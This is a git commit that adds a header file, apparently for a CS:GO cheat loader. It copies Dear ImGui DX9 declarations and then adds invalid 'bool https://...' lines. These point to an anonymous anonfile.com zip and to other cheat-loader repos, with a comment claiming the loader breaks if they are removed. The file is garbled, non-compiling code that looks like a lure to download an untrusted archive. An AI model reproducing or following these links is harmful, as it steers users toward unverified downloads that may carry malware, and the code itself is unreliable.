caad43ff9fafd117a44b9536077b4bf172fadf4e
SERKI#0463 (hackshub) <79936930+hellloim@users.noreply.github.com>
2022-05-31 21:01:45 +0200

    Create ASAP.loader.h

---
+++ ASAP.loader.h
@@ -0,0 +1,16 @@
+struct IDirect3DDevice9;
+
+IMGUI_IMPL_API bool     ImGui_ImplDX9_Init(IDirect3DDevice9* device);
+IMGUI_IMPL_API void     ImGui_ImplDX9_Shutdown();
+IMGUI_IMPL_API void     ImGui_ImplDX9_NewFrame();
+IMGUI_IMPL_API void     ImGui_ImplDX9_RenderDrawData(ImDrawData* draw_data);
+
+// Use if you want to reset your rendering device without losing Dear ImGui state.
+IMGUI_IMPL_API bool     ImGui_ImplDX9_CreateDeviceObjects();
+IMGUI_IMPL_API void     ImGui_ImplDX9_InvalidateDeviceObjects();
+bool https://anonfile.com/Hbr6P1w5o7/libs_zip // bools this file, if you remove this code the loader will not work!
+bool https://github.com/leeza007/csgo-cheat-loader2/blob/master/utils.hpp
+bool https://github.com/morelli690/CSGO-Cheat-Loader2/blob/master/Dll%20Encryptor/dll_tool/Properties/Settings.settings
+bool https://github.com/morelli690/CSGO-Cheat-Loader2/blob/master/Dll%20Encryptor/dll_tool/Properties/AssemblyInfo.cs
+bool https://github.com/morelli690/CSGO-Cheat-Loader2/blob/master/Loader/Auth/Handler.cs
+(csgo.exe)
